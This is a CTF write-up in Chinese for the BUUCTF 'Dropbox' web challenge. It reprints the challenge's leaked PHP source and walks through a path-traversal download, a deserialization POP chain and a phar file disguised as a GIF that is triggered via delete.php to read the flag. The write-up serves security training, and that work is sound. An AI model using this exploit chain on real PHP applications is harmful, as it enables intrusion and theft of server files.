###Dropbox
地址：[buuctf/dropbox](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox)
这题套路差不多，也是phar触发的反序列化，每次比赛都有这样的题。。。这题没啥说的，主要是细心。
随便注册个账号，直接登录进去，有三个功能：上传、下载、删除。肯定要试试任意下载，果然有一个。先试了passwd验证了之后想开始找目录，找了半天发现用../../index.php就行了。
下载源码分析几个主要的文件，分别是class.php、download.php和delete.php。
class.php
```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;


    public function __construct() {
        global $db;
        $this->db = $db;
    }


    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }


    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }


    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }


    public function __destruct() {
        $this->db->close();
    }
}


class FileList {
    private $files;
    private $results;
    private $funcs;


    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);


        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);


        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }


    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }


    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}


class File {
    public $filename;


    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }


    public function name() {
        return basename($this->filename);
    }


    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }


    public function detele() {
        unlink($this->filename);
    }


    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```
download.php
```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");


chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```
delete.php
```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```
先找找有没有什么敏感函数，File类中open方法有file_exists可以触发phar的反序列化，close方法有file_get_contents可以读内容。所有就根据这两处找找利用链。最开始想到就是User类中的析构函数调用了db属性的close方法，可以把db赋值为一个File类，调用同名函数。
但是这有个问题，读完了文件并没有回显的地方，所以这其实是个坑。再看看发现回显是在FileList中call方法给list赋值，然后destruct中打印。
运行这个生成phar文件
```php
<?php
    class User {
        public $db;
    }
    class FileList {
        private $files;
        public function __construct(){
            $this->files=array(new File());
        }
    } 
    class File{
        public $filename = "/flag.txt";
    }
    $o = new User();
    $o->db =new FileList();
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    copy("phar.phar","test.gif")
?>
```
User->db是FileList类，Userdestruct时会调用db的close方法，因为FileList没有close方法所以触发call函数，call里面的逻辑就是再去调用\$file的同名方法，$file是一个File类，所以就调用了File的close方法，读取了文件，存到FileList类的result中，destruct时候打印到页面。
有了pop链然后就是找触发反序列化的点，看上去有三个参数可控点可以触发，分别是download.php中和delete.php中调用的File类的open方法，其中有file_exist函数。另外是delete.php中调用的File的delete方法，里面有unlink函数。
但实际上unlink那里的没办法传参，参数是不可控的，只能通过open方法。而download中的open方法前面被open_basedir限制了路径，没办法利用。所以最后的触发点就是delete.php中的filename参数。上传伪装的phar文件test.gif，然后向delete.php用post发送filename=phar://test.gif就会在返回值中打印出flag 	

#参考链接
phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E6%B5%85%E6%9E%90/
http://adm1n.design/2019/09/10/Ciscn%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Dropbox/
https://xz.aliyun.com/t/2715